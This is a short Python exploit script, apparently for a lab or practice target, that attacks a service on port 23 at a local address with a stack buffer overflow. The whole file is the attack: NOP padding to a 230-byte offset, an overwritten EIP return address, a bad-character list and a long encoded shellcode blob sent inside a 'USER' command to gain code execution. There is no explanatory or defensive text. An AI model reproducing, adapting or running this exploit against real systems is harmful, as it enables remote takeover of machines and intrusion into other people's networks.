import socket,struct

host="192.168.1.14"
port=23
s=socket.socket()
s.connect((host,port))
offset=230
padding=b"\x90"*offset
eip=struct.pack("<I",0x7750595B)
#badchars: \x00\x0a\x0d
shellcode =  b""
shellcode += b"\x31\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x80\x7d\x90\x6f\x83\xee\xfc"
shellcode += b"\xe2\xf4\x7c\x95\x1f\x6f\x80\x7d\xf0\x5e\x52"
shellcode += b"\xf4\x75\x0b\x0b\x2f\xa0\xe4\xd2\x71\x1b\x3d"
shellcode += b"\x94\x4c\x6f\xe4\xf2\x55\x9f\xd8\xca\x5b\xa1"
shellcode += b"\xaf\x2c\x41\xf1\x13\x82\x51\xb0\xae\x4f\x70"
shellcode += b"\x91\xa8\xc9\x08\x7f\x3d\x0b\x2f\x80\x38\x0b"
shellcode += b"\x3f\xac\x6e\x50\xf6\xd0\x17\x05\xbd\xe4\x23"
shellcode += b"\x81\xad\x1b\x37\xa0\x7c\x43\xe4\xc8\x65\xc0"
shellcode += b"\xea\x49\x09\xac\x26\x0b\x49\x1b\x6e\x56\x4c"
shellcode += b"\x6f\x5e\x40\xd1\x51\xa0\x8d\x7c\x57\x57\x60"
shellcode += b"\x08\x64\x6c\xfd\x85\xab\x12\xa4\x08\x70\x37"
shellcode += b"\x0b\x25\xb4\x6e\x53\x1b\x1b\x63\xcb\xf6\xc8"
shellcode += b"\x73\x81\xae\x1b\x6b\x0b\x7c\x40\xe6\xc4\x59"
shellcode += b"\xb4\x34\xdb\x1c\xc9\x35\xd1\x82\x70\x37\xdf"
shellcode += b"\x27\x1b\x7d\x69\xfd\x6f\x90\x7f\x20\xf8\x5c"
shellcode += b"\xb2\x7d\x90\x07\xf7\x0e\xa2\x30\xd4\x15\xdc"
shellcode += b"\x18\xa6\x7a\x19\x87\x7f\xad\x28\xff\x81\x7d"
shellcode += b"\x90\x46\x44\x29\xc0\x07\xa9\xfd\xfb\x6f\x7f"
shellcode += b"\xa8\xfa\x65\xe8\xbd\x38\x6e\x8d\x15\x92\x6f"
shellcode += b"\x84\xaf\x19\x89\xd0\x2d\xc0\x3f\xc0\x2d\xd0"
shellcode += b"\x3f\xe8\x97\x9f\xb0\x60\x82\x45\xf8\xea\x6d"
shellcode += b"\xc6\x38\xe8\xe4\x35\x1b\xe1\x82\x45\xea\x40"
shellcode += b"\x09\x9a\x90\xce\x75\xe5\x83\x68\x1a\x90\x6f"
shellcode += b"\x80\x17\x90\x05\x84\x2b\xc7\x07\x82\xa4\x58"
shellcode += b"\x30\x7f\xa8\x13\x97\x80\x03\xa6\xe4\xb6\x17"
shellcode += b"\xd0\x07\x80\x6d\x90\x6f\xd6\x17\x90\x07\xd8"
shellcode += b"\xd9\xc3\x8a\x7f\xa8\x03\x3c\xea\x7d\xc6\x3c"
shellcode += b"\xd7\x15\x92\xb6\x48\x22\x6f\xba\x03\x85\x90"
shellcode += b"\x12\xa8\x25\xf8\x6f\xc0\x7d\x90\x05\x80\x2d"
shellcode += b"\xf8\x64\xaf\x72\xa0\x90\x55\x2a\xf8\x1a\xee"
shellcode += b"\x30\xf1\x90\x55\x23\xce\x90\x8c\x59\x9f\xea"
shellcode += b"\xf0\x82\x6f\x90\x69\xe6\x6f\x90\x7f\x7c\x53"
shellcode += b"\x46\x46\x08\x51\xac\x3b\x8d\x25\xcd\xd6\x17"
shellcode += b"\x90\x3c\x7f\xa8\x90\x6f"

payload=padding+eip+b"\x90"*16+b"\x90"+shellcode

s.send(b'USER '+payload+b"\r\n")
